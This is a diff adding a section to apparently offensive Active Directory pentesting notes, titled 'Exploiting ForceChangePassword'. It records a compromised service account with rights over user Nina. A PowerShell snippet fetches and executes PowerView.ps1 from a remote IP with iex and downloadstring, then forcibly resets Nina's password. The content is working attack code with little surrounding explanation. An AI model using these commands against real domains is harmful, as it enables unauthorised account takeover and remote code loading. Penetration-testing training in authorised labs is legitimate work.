@@ -719,6 +719,22 @@ runas /user:corp\jen powershell.exe
 
 <details>
 
+<summary>Exploiting ForceChangePassword</summary>
+
+<figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>
+
+Currently, pwned adminwebsvc@final.com --> part of webadmins grp --> able to ForceChangePassword for Nina
+
+```powershell
+iex(new-object net.webclient).downloadstring('http://192.168.45.160/PowerView.ps1')	
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity Nina -AccountPassword $NewPassword
+```
+
+</details>
+
+<details>
+
 <summary>Unconstrained Delegation</summary>
 
 ![](<../.gitbook/assets/image (313).png>)
